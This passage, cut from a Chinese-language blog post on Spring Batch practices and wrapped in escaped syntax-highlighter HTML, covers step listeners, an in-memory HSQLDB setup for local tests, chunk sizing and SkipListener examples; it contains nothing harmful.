&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;skipLimit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;UnknownGenderException&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;listener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;logSkipListener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-14&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;在这个例子中可以很清楚的看到该step的配置，比如reader/processor/writer组件，以及配置了哪些listener等。&lt;/p&gt;
&lt;h3&gt;本地集成测试中使用内存数据库&lt;/h3&gt;
&lt;p&gt;Spring batch在运行时需要数据库支持，因为它需要在数据库中建立一套schema来存储job和step运行的统计信息。而在本地集成测试中我们可以借助Spring batch提供的内存Repository来存储Spring batch的任务执行信息，这样既避免了在本地配置一个数据库，又可以加快job的执行。先为Job的配置类添加扩展类：DefaultBatchConfigurer。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46540504342481&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public class CustomJobConfiguration extends DefaultBatchConfigurer {

    ...
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46540504342481-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46540504342481-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46540504342481-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46540504342481-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46540504342481-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;CustomJobConfiguration&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DefaultBatchConfigurer&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46540504342481-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46540504342481-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46540504342481-4&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;我们在build.gradle中加入对hsqldb的依赖：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46544937768421&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
runtime(‘org.hsqldb:hsqldb:2.3.2’)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46544937768421-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46544937768421-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;‘&lt;span class=&quot;crayon-v&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hsqldb&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hsqldb&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2.3.2&lt;/span&gt;’&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;然后在测试类中添加对DataSource的配置。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46547952726554&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
@EnableAutoConfiguration
@EnableBatchProcessing
@DataJpaTest
@Import({DataSourceAutoConfiguration.class, BatchAutoConfiguration.class})
public class TestConfiguration {

}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46547952726554-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46547952726554-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46547952726554-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46547952726554-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46547952726554-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46547952726554-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46547952726554-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46547952726554-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;EnableAutoConfiguration&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46547952726554-2&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;EnableBatchProcessing&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46547952726554-3&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DataJpaTest&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46547952726554-4&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Import&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DataSourceAutoConfiguration&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;BatchAutoConfiguration&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46547952726554-5&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;TestConfiguration&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46547952726554-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46547952726554-7&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;并且在applicaton.properties配置中添加初始化Database的配置：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a4654a079024025&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
spring.batch.initializer.enable=true&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654a079024025-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4654a079024025-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;spring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;batch&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;initializer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;enable&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;合理的使用Chunk机制&lt;/h3&gt;
&lt;p&gt;Spring batch在配置Step时采用的是基于Chunk的机制。即每次读取一条数据，再处理一条数据，累积到一定数量后再一次性交给writer进行写入操作。这样可以最大化的优化写入效率，整个事务也是基于Chunk来进行。&lt;/p&gt;
&lt;p&gt;当我们在需要将数据写入到文件、数据库中之类的操作时可以适当设置Chunk的值以满足写入效率最大化。但有些场景下我们的写入操作其实是调用一个web service或者将消息发送到某个消息队列中，那么这些场景下我们就需要设置Chunk的值为1，这样既可以及时的处理写入，也不会由于整个Chunk中发生异常后，在重试时出现重复调用服务或者重复发送消息的情况。&lt;/p&gt;
&lt;h3&gt;使用Listener来监视job执行情况并及时做相应的处理&lt;/h3&gt;
&lt;p&gt;Spring batch提供了大量的Listener来对job的各个执行环节进行全面的监控。&lt;/p&gt;
&lt;p&gt;在job层面Spring batch提供了JobExecutionListener接口，其支持在Job开始或结束时进行一些额外处理。在step层面Spring batch提供了StepExecutionListener，ChunkListener，ItemReadListener，ItemProcessListener，ItemWriteListener，SkipListener等接口，同时对Retry和Skip操作也提供了RetryListener及SkipListener。&lt;/p&gt;
&lt;p&gt;通常我们会为每个job都实现一个JobExecutionListener，在afterJob操作中我们输出job的执行信息，包括执行时间、job参数、退出代码、执行的step以及每个step的详细信息。这样无论是开发、测试还是运维人员都对整个job的执行情况了如指掌。&lt;/p&gt;
&lt;p&gt;如果某个step会发生skip的操作，我们也会为其实现一个SkipListener，并在其中记录skip的数据条目，用于下一步的处理。&lt;/p&gt;
&lt;p&gt;实现Listener有两种方式，一种是继承自相应的接口，比如继承JobExecutionListener接口，另一种是使用annoation（注解）的方式。经过实践我们认为使用注解的方式更好一些，因为使用接口你需要实现接口的所有方法，而使用注解则只需要对相应的方法添加annoation即可。&lt;/p&gt;
&lt;p&gt;下面的这个类采用了继承接口的方式，我们看到其实我们只用到了第一个方法，第二个和第三个都没有用到。但是我们必须提供一个空的实现。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a4654e314816687&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public class CustomSkipListener implements SkipListener {
    @Override
    public void onSkipInRead(Throwable t) {
        // business logic
    }

    @Override
    public void onSkipInWrite(String item, Throwable t) {
        // no need
    }

    @Override
    public void onSkipInProcess(String item, Throwable t) {
        // no need
    }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4654e314816687-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4654e314816687-2&quot;&gt;2&lt;/div&gt;
